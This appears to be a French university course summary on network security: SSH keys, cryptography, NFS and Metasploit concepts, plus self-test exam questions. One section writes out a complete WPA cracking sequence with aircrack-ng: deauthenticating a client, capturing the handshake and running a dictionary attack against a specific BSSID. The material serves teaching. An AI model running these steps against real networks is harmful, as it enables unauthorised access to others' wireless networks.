# UE Sécurité et Administration des réseaux 

> Ce document est constitué de plusieurs sections. Chaque section propose un
> résumé des notions et commandes vu pendant les séances de cours et de TP.  La
> dernière section propose des questions afin de vous permettre de vous auto
> évaluer.  Ce sont des questions typique d'examen.

## Initiation

Lors de la première séance nous avons vu qu'est-ce qu'un mot de passe « solide
» et comment le construire (ex: A partir d'une phrase...).  Il est important de
laisser l'utilisateur le choisir mais lui expliquer comment le construire.

Nous avons ensuite vu comment créer de nouveaux utilisateurs en CLI (commande
de ligne). Avec la commande `adduser`.  Puis comment se faire passer pour un
utilisateur. La commande `su` suivi du login de l'utilisateur (Ex: su moi)

La solidité du mot de passe mise à l'épreuve avec John the Ripper, un petit
outil logiciel permettant soit une attaque brute, soit par dictionnaire. Il est
utilisé sur le contenu des fichiers `/etc/shadow` (qui contient les mots de
passe *hashé*).

Désactivation d'un compte en plaçant une étoile (\*) dans `/etc/password`
(non vu en cours).

Nous avons ensuite interconnecté deux machines (en *back-to-back*) avec un
câble Ethernet équipé de connecteurs RJ-45.Remarque: On utilise un câble croisé
(de préférence) quand on interconnecte directement deux machines entre elles
(sans passé par un commutateur (switch)).

Configuration de l'interface réseau. On associe une adresse IP (privé) et un
masque à l'interface ethernet par exemple `ifconfig eth0 192.168.0.42/24 up`

Vérification du bon fonctionnement de l'interconnexion avec ping `ping
192.168.0.73`

Observation de ce qui se passe sur le lien avec **wireshark**  (ex: on remarque
que les paquets ping echo/reply utilise le protocole ICMP)

Observation du mot de passe qui circule en clair sur le réseau lorsqu'un
utilisateur utilise le client telnet qui lui permet de se connecter à une
machine distante sur laquelle tourne le daemon (serveur) telnetd. Conclusion :
On préfèrera utiliser ssh.

Liste des commandes et fichiers utilisées pendant la séance :
```sh
adduser toto
su toto
apt-get update
apt-cache search john 
apt-get install john telnetd
ifconfig
ping
wireshark
/etc/password
/etc/shadow
```

## Introduction à la sécurité

Les attaques « simples » :

  - contre une machine (pour la mettre hors d'usage, ou l'utilisé comme relais, ou comme attaquant)
  - Un serveur attaqué privera ses usagers d'un service rendu (DoS ou Denial of Service)
  - Usurpation : Utiliser l'IP d'un hôte (IP spoofing).
  - Virus : Besoin d'un programme hôte
  - Vers : Intégre des mécanismes pour se déployer (ex: lecture de l'address book)
  - Backdoors : porte dérobées qui permet le contrôle de la machine à distance.
  - Escalade de privilège : faille d'un logiciel qui permet de passer admin (id=0 → root)

Les attaques « complexes » : DDoS (Distributed DoS) nécessite de détourner les
ressources d'une multitude d'hôtes et de les coordonnées.

Objectif des attaques : Fausser les relation établies au sein du réseau
(abusant les correspondants, altérant les contenus, détournant les protocoles).

Afin de réduire les risques il faut garantir

  - La Confidentialité → Crypté (ou chiffré)
  - L'Intégrité → Pas de modification pendant le transfert
  - L'Authentification → S'assurer de l'origine des données
  - La non-répudiation → on a la preuve que le destinataire à bien reçu l'information

Chiffrement : notion de base en cryptographie

Deux façons de chiffrer des données : symétrique (clé partagé) ou asymétrique (paire de clés privé/publique).

Chiffrement **Symétrique** (bloc) DES, AES : Opérations de permutation,
décalage, substitutions.  Déchiffrer un message sans la clé doit être très
difficile (impossible !), mais la mise en oeuvre avec la clé (chiffrement et
déchiffrement) doit être facile (peu consommateur de ressources). Les algo de
chiffrement et de déchiffrement peuvent être connus de tous.

Problème du chiffrement symétrique : Nécessite de stocker une clé par interlocuteur :(

Chiffrement **Asymétrique** (RSA, Ronald Rivest, Adi Shamir et Leonard Adleman
, 1978) : Basé sur les propriétés des nombres premiers et de la factorisation
(un nombre entier peut être décomposé en produit de nombre premiers).
Nécessite plus de ressources de calculs.

Deux clés : Une clé de cryptage (qui est la clé publique calculé à partir de la
clé privé) et une clé de déchiffrage (la clé privé).

Intégrité : Condensat (ou résumé, ou manifest, empreinte ou digest) de message.
Fonction de hashage, génère une empreinte (ex: MD5, SHA1,...). Repose sur des
fonctions mathématique à « sens unique ». Impossible de retrouver le message à
partir de la seule empreinte, et la moindre modif génère une empreinte
complètement différente.

Signature (numérique) : L'auteur signe le « condensat » avec sa clé privée.
Certificats : Permet de répondre à la question « La clé publique de A est elle
vraiment à A ? » Les certificats électronique : infrastructure à clé publique
(hiérarchique) , ou toiles de confiance (organisation à plat).

Bilan:

  - Chiffement symétrique : (+) simplicité des opérations, (-) complexité de la gestion des clés
  - Chiffrement Asym. : (-) Complexité des opérations, (+) simplicité de la distribution de la clé publique

Compromis : On fait usage de clés asymétriques pour échanger une clé secrète partagée.

Example: TLS assure confidentialité, intégrité, authentification sans modifier les protocoles applicatifs existant
(http/https)

MD5 (Message Digest 5) est une fonction de hashage cryptographique qui calcule,
à partir d'un fichier numérique, son empreinte numérique (en l'occurrence une
séquence de 128 bits ou 32 caractères en notation hexadécimale) avec une
probabilité très forte que deux fichiers différents donnent deux empreintes
différentes. Malgré ces faiblesses, la fonction MD5 reste encore largement
utilisée comme outil de vérification lors des téléchargements et l'utilisateur
peut valider l'intégrité de la version téléchargée grâce à l'empreinte (ex:
image ISO d'un CD).

Exemple : http://cdimage.debian.org/debian-cd/7.2.0/i386/iso-cd/

## SSH (connexion sans mot de passe)

Comment se connecter à partir de la machine A sur un compte distant, héberger sur une machine B, sans taper
systématiquement son mot de passe :

A partir de son compte (machine A) on génére une clé publique et une clé privé
`ssh-keygen -t dsa`

On obtient, dans le dossier `~/.ssh`, `id_dsa.pub` (la clé publique) et
`id_dsa` (la clé privé à ne surtout pas diffuser)

Lors de la création, OpenSSH vous demande une *passphrase* qui est un mot de
passe pour protéger la clef privée.

Cette passphrase sert à chiffrer la clef privée. La pass phrase vous sera alors
demandée à chaque utilisation de la clef privée, c'est-à-dire à chaque fois que
vous vous connecterez en utilisant cette méthode d'authentification. Un
mécanisme appelé ssh-agent permet de ne pas rentrer le mot de passe à chaque
fois, comme nous le verrons un peu plus loin.

Vérifier les droits d'accès du répertoire ~/.ssh (700), de id_dsa.pub (lecture
pour tous), et de id_dsa (lecture exclusivement pour le propriétaire !!!)

Sur la machine B distante. Créer le répertoire ~/.ssh si il n'existe pas, puis
copier/coller la clé publique (contenu dans id_dsa.pub) dans le fichier
`~/.ssh/authorized_keys`

Enfin, on pourra se connecter avec la commande : `ssh username@machineB`
(confirmer avec yes la première fois, cela cré le fichier `~/.ssh/known_hosts`)

Une manière automatisée de copier sa clé publique dans le authorized_keys de la machine distante est d'utiliser :
`ssh-copy-id username@machineB`

*NB:* Lorsque l'on a plusieurs jeux de clés, on peut préciser explicitement
celle que l'on veut utiliser avec l'option `-i`.

Remarque : Ne pas pas autoriser la connexion distante au compte root via SSH (que ce soit par mot de passe ou par
clés). Notez que c'est la configuration par défaut sur Debian.

Transfert de fichiers via SSH : la commande scp

Remarque : un avantage non négligeable d'avoir une authentification par clef, c'est que l'auto-complétion des chemins
quand on tape une commande scp fonctionne aussi avec l'arborescence distante.

Usage d'un agent (quand on a mis une passphrase à sa clé privé) : En mode graphique le ssh-agent est
généralement déjà lancé (sinon eval $(ssh-agent)). Ajouté les clés publique avec `ssh-add`.

Conseil : Surveiller les connexions en lisant régulièrement le fichier de log `/var/log/auth.log` avec la
commande `last`.

## Démo intrusion Wifi (WPA)



Rappel des commandes saisies lors de la démonstration faite en cours.

Ressources utiles :

- [Cracking WPA WPA2 with Kali Linux (verbal step by step guide)](https://www.youtube.com/watch?v=kpI3fQjf43E)
- [Wireless LAN Security and Penetration Testing Megaprimer (un cours complet en vidéo)](http://www.securitytube.net/groups?operation=view&groupId=9)
- [La distribution Linux la plus adaptée pour s’initier au “Pentesting”](https://www.kali.org/)
- [Le matériel que j’utilise](http://www.wifi-highpower.com/cartes-wifi-usb/39-awus036nha-carte-wifi-usb-alfa-network-1000-mw-et-antenne-5-dbi.html)
- [Un lien vers un certain nombre de dictionnaire (ex : rockyou.txt utile pour WPA)](https://wiki.skullsecurity.org/Passwords)
```
	### Exemple WPA ##################################
	# Passe la carte wifi en mode monitor
	airmon-ng start wlan0
	# On note :
	ESSID: VictimAP
	BSSID : 00:12:17:07:9C:78
	Channel: 1
	Client: D0:25:98:18:3B:FD
	# Pour cette attaque la presence d’un client est nécessaire.
	# choose your target (bssid, channel, mac@ client )
	airodump-ng wlan0mon
	# logger
	airodump-ng wlan0mon -w out --bssid 00:12:17:07:9C:78 --encrypt wpa -c 1
	# Stock la capture dans out-01.cap
	# envoyer un deauth, vérifier si on obtient un handshake avec la commande précédente
	aireplay-ng -0 1 -a 00:12:17:07:9C:78 -c D0:25:98:18:3B:FD wlan0mon
	# appliquer un dictionnaire...
	aircrack-ng -w /path-to-DICO/rockyou.txt -b 00:12:17:07:9C:78 out-01.cap
```

## Test d’intrusion (Metasploit)

- Un test d’intrusion (ou *pentest*) est une méthode d’évaluation de la
sécurité d’un système ou d’un réseau informatique.
- Simulation d’un utilisateur (ou logiciel) malveillant.
- Le testeur adopte la position d’un attaquant potentiel.
- Le testeur analyse les risques potentiels du a :
- Une mauvaise configuration d’un système
- Un défaut de programmation
- Objectif : Trouver des vulnérabilités exploitables en vue de
proposer un plan d’actions permttant d’améliorer la sécurité
d’un système.

### Trois types d’analyse
- Blackbox : Le testeur se met dans la peau de
l’attaquant et ne possède a priori aucune
information.
- Greybox : Le testeur possède un nombre limité
d’informations (ex: un compte pour passer l’étape
d’authentifica)on).
- Whitebox : Le testeur possède les informations dont
il a besoin (ex: schéma d’architecture, compte
utilisateur, code source, ...).

### Définitions

**Social-engineering (ingénierie sociale)** : Forme d’acquisition déloyale
d’informations. [Exploite les failles
humaines](https://www.youtube.com/watch?v=lc7scxvKQOo).

**Spear phishing :** Contrairement au phishing le message est ici
fortement personnalisé et envoyé à un nombre très limité
d’utilisateurs (parfois un seul).

Principes fondamentaux nécessaire au bon déroulement d’un test (cf. PTES)
  
1. Préengagement
1. Collecte de renseignements
1. Détermina)on de la menace
1. Analyse des vulnérabilités
1. L’exploita)on
1. Post exploita)on
1. Le rapport
  
### Introduction à Metasploit

- Le framework Metasploit (MSF) est très utilisé
par les professionnels de la sécurité de
l’information.
- Gratuit, Open source + deux versions
commerciales.
- C’est un cadre qui fournit l’infrastructure
nécessaire pour automatiser les tâches
routinières ou complexes.

#### Metasploit : Terminologie
- Exploit : c’est le moyen par lequel le pentester profite d’un
défaut dans un système, une application ou un service. On
l’utilise pour attaquer et produire un résultat que les
développeurs n’avaient pas envisagé (injection sql, buffer
overflow, ...).
- Payload : code que l’on veux faire exécuter sur la cible (ex:
reverse_shell)
- Shellcode : suite d’instructions utilisées par un payload qui
fournit généralement un shell (ou meterpreter shell).
- Module : part de logiciel utilisé par le framework Metasploit.
- Listener : composant qui attend une connexion entrante.


#### Metasploit : MSFconsole
- MSFconsole fournit une interface pratique
tout-en-un pour toutes les options et tous les
réglages disponibles.
- On peut y lancer un exploit, charger un
module auxiliaire, faire une énumération,
créer des listeners ou lancer une exploitation
massive contre tout un réseau.

#### Collecte de renseignements
La collecte permet d’obtenir des informations précises sur votre
cible sans révéler vos intentions. Elle exige une préparation
minutieuse (pour ne pas manquer des vecteurs d’attaque) et la
faculté de penser tel un attaquant.
Notez tout ! Soyez méthodique et précis.

  - Collecte d’information passive
    - Whois, Netcrax, nslookup, réseaux sociaux, moteurs de recherche,...
  - Collecte d’information active
    - Scan de ports (nmap)
  - Scan ciblé
    - SMB, Microsox SQL, SSH, FTP, SNMP,...

#### Les joies de l’exploitation
- La possibilité de prendre enfin le contrôle
total sur une machine cible (mais ne soyez pas
stupide !)
- MSFconsole (demo)
show exploits, show auxiliary, show op&ons, search,
use, show payloads, show targets, info, set/unset,
setg/unsetg, save, ...

#### Escalade de privilèges
(*Privilege escalation*)

- Parfois on compromet un compte utilisateur
ayant des droits limités.
- Empêche l’exécution de commandes qui
nécessitent des droits administrateurs.
- En élevant les droits d’un compte, nous
surmonterons ces restrictions.
- [Example](http://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/)

### Conclusion
- Les tests d’intrusion sont un moyen de simuler
les méthodes d’un pirate.
- On ne peut pas devenir un expert de la
sécurité informatique du jour au lendemain.
- Adoptez une méthodologie (ex: PTES)


## NFS

Rappel sur une clé USB ou autre mémoire de masse (disque dur):
Partitionner ((c)fdisk), formater (mkfs.ext4) puis monter (mount) la clé USB dans le système de fichiers.

A partir de quel device la clé et ses partitions sont accessibles : dmesg

Installation du package NFS. Vérifié qu'il est déjà installé. dpkg -l | grep nfs

Sur le poste serveur : `apt-get install nfs-common`

A défaut de serveur DNS (résolution de nom), on rajoute des entrées dans `/etc/hosts` pour éviter de taper des
adresses IP.

Pour démarrer/stopper un service sous GNU/Linux Debian
`/etc/init.d/nomduservice start|stop|restart`
ou
`service nomduservice start|stop|restart`

Mise en place d'un système de fichier partagé : NFS (Network File System)

**Coté Serveur :** dont l'adresse IP est 192.168.0.42

  - mkdir /tmp/disk1
  - Éditez /etc/exports (/tmp/disk1 addresseIPduClient(rw,sync,no_subtree_check))
  - exportfs -rv
  - /etc/init.d/nfs-kernel-server restart
  - showmount -e 192.168.0.42

**Coté Client :**

  - mkdir /mnt/disk1
  - mount -t nfs 192.168.0.42:/tmp/disk1 /mnt/disk1
  - Pour rendre le montage automatique à chaque re-démarrage du système éditer `/etc/fstab`
```
192.168.0.42:/tmp/disk1 /mnt/disk1 nfs defaults,user,auto,noatime,intr 0 0
```

Assurez vous que le système de fichiers exporté via NFS est bien accessible en lecture et en écriture. Si tel n'est pas le
cas, modifiez les droits d'accès et ou modifiez le propriétaire (chown nobody:nogroup ...)

Utilisation de Wireshark pour déterminer quel protocole de transport est utilisé et si les transferts sont chiffrés.
(Protocole de transport : TCP ; Le contenu des fichiers passe en clair)

Exercice : Exposez le contenu d'une clé USB à l'ensemble de la salle.

Liste des commandes et fichiers utilisées pendant la séance :
```
cfdisk ou fdisk
mkfs.ext2 ou mkfs.vfat
mount
dpkg -l | grep ...
/etc/hosts
/etc/fstab
/etc/exports
```



## Contrôles de connaissances

### Questions A

1. Proposez un mot de passe solide : 
2. Quelle commande vous permet de « vous faire passer » pour un autre utilisateur : 
3. Vous êtes connecté en tant que l'utilisateur moi et vous voulez vous faire
   passer pour l'utilisateur bilbo. Devez- vous saisir un mot de passe ? **OUI
/ NON**
1. Vous êtes connecté en tant que « root » et vous voulez vous faire passer pour l'utilisateur « luke ». Devez-vous
saisir un mot de passe ? **OUI / NON**
1. Leia s'approche d'un poste resté allumé avec un terminal ouvert. Elle s'exclame « Wahoo! Une session root est
restée ouverte ! ». Comment peut elle supposer cela ? 
6. Quelle CLI utilisez-vous pour associer une adresse IP à un interface réseaux Ethernet : 
7. A quoi sert la commande ping ? 
8. A quoi sert le logiciel Wireshark ? 
9. A quoi servent les apt tools ? 
10. Sur un système à la Unix récent le fichier `/etc/password` contient le hash des mots de passes. **OUI/NON**


### Questions B

1. L'empreinte d'un fichier texte README.txt obtenue avec la commande MD5 est
5215b545899c66fdd6916ea0e916bd68. Je modifie un et un seul caractère du fichier README.txt.
Si je relance MD5 dessus je vais obtenir une empreinte différente :
□ un peu □ beaucoup □ à la folie □ passionnément □ pas du tout
2. Afin de réduire les risques on doit pouvoir garantir :
C O N F I .......... ; I N T É ..... ; A U T H ............
3. Le chiffrage symétrique est basé sur deux clés symétriques : **□ OUI / □ NON**
4. Pour signer un document il est nécessaire de signer le « condensat » (ou l'empreinte) du document avec sa clé
□ publique □ privé □ les deux
5. Quel est le problème du chiffrement symétrique ? 
6. Quelle clé dois-je copier dans le fichier `~/.ssh/authorized_keys` de la machine distante ?
□ Ma clé Privée □ ma clé Publique □ les deux
7. A quoi cela sert-il ? 
8. A quoi sert une passphrase ? : 
9. Quelle(s) clé(s) doit utiliser votre petit ami(e) pour chiffrer une lettre d'amour qu'il (elle) veux vous envoyer :
□ sa clé publique □ sa clé privée □ votre clé publique □ votre clé privée
10. Quel est l’intérêt de faire usage de clés asymétriques pour échanger une clé secrète partagée (ex : TLS).

### Questions C


Description|Répertoire
--------------------------------------------|----------    
Les fichiers des utilisateurs		    | /tmp 
Le fichier de log de Apache (serveur web)   | /boot
Le noyau Linux				    | /var/log
Un fichier temporaire (toto.tmp)   	    | /home

  2. Dans le tableau ci-dessus, reliez la description des fichiers vers le
     répertoire qui correspond le mieux.
  1. Ordonnez les lignes de commandes suivantes :
    1. dmesg
    1. umount ./pointdemontage
    1. mkdir ./pointdemontage
    1. mount /dev/sdb1 ./pointdemontage
    1. fdisk /dev/sdb # je partitionne
    1. mkfs.ext2 /dev/sdb1 # je formate
    1. touch ./pointdemontage/itworks.tst
  3. Le protocole NFS ne chiffre pas les données qui passe sur le réseau : **VRAI / FAUX**
  4. On peut arrêter un serveur NFS n'importe quand, cela n'impact pas les
     postes clients : **VRAI / FAUX**
  5. Voici une liste d'opérations susceptibles d'être réalisées lors d'un audit
     de sécurité (ex : pentesting) du système informatique d'une entreprise.
Ordonnez les :
    1. Signature d'un document vous autorisant à pénétrer le système informatique de l'entreprise audité.
    1. Installation d'une backdoor
    1. Nettoyage des traces (ex : suppression des fichiers de logs)
    1. Récupération d'informations (attaque active) nmap, sqlmap,...
    1. Escalade de privilège
    1. Exploitation d'une faille
    1. Repérage des failles (version logiciel)
    1. Récupération d'informations (attaque passive ) Google, whois, Wireshark,...
    1. Brute force
    1. Ingénierie social (ex : envoie de mail avec un cheval de Troie, demande du mot de passe à l'utilisateur,...)
    1. Rédaction d'un document bilan pour le client.

